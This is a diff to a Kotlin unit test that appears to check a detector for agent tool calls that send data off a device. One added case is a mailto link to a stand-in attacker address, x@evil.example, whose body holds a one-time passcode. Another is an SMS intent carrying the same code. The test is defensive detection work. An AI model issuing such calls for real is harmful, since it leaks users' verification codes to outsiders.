@@ -37,4 +37,12 @@ class ToolHubSendOutTest {
         assertTrue(sendOut("""{"uri":"intent://x#Intent;package=com.whatsapp;end"}""", app = whatsapp))
         assertTrue(sendOut("""{"query":"weather"}""", egress = true))
     }
+
+    @Test
+    fun `a link with no slashes still counts`() {
+        assertTrue(sendOut("""{"uri":"mailto:x@evil.example?body=otp%20482913"}"""))
+        assertTrue(sendOut("""{"action":"android.intent.action.SENDTO","data":"sms:12345?body=otp%20482913"}"""))
+        // A JSON key, a package and a time of day are not links.
+        assertFalse(sendOut("""{"package":"com.android.settings","note":"at 10:30"}"""))
+    }
 }
